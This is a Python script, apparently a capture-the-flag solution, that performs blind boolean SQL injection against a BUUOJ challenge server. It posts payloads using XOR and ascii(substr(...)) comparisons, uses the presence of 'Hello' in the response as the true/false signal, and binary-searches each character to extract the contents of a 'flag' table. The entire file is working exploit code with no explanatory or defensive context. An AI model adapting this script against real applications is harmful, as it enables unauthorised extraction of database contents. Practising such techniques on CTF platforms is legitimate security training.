import requests
url = "http://c60f5e78-ecb0-4884-9898-0c1a751dfc50.node3.buuoj.cn/index.php"
temp = {}
a = ""
for i in range(1,1000):
    low = 32
    high =128
    mid = (low+high)//2
    while (low<high):
        payload = "0^"+"(ascii(substr((select(flag)from(flag)),{0},1))>{1})".format(i,mid)
        #payload = "0^"+"(ascii(substr((select(flag)from(flag)),{0},1))>{1})".format(i, mid)
        temp = {"id":payload}
        r = requests.post(url,data=temp)
        if "Hello" in r.text:
            low = mid+1
        else:
            high = mid
        mid =(low+high)//2
    if(mid ==32 or mid ==127):
        break
    a +=chr(mid)
    print(a)
print("password=",a)